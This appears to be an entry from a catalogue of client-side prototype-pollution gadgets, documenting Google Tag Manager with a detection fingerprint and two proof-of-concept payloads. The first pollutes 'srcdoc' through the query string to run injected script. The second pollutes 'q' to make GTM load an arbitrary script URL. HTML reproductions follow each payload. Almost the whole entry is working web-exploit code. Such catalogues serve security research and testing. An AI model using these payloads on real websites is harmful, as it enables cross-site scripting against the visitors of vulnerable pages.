## Google Tag Manager

### URL

https://tagmanager.google.com/

### JS Fingerprint

```js
return (typeof google_tag_manager !== 'undefined')
```

### PoC

#### PoC #1 (Depends on the GMT tags used)

```
?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>
```

```html
<script>
    Object.prototype.vtp_enableRecaptcha = "1";
    Object.prototype.srcdoc = "<script>alert(123)<\/script>";
</script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KXRTW3N');</script>
```

#### PoC #2 (Depends on the GMT tags used)

**This gadget requires Arrays support**

```
?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7
```

```html
<script>
    Object.prototype.q = [['require', 'x', 'https://www.google-analytics.com/gtm/js?id=GTM-WXTDWH7']];
</script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-WFHQQ63');</script>
```
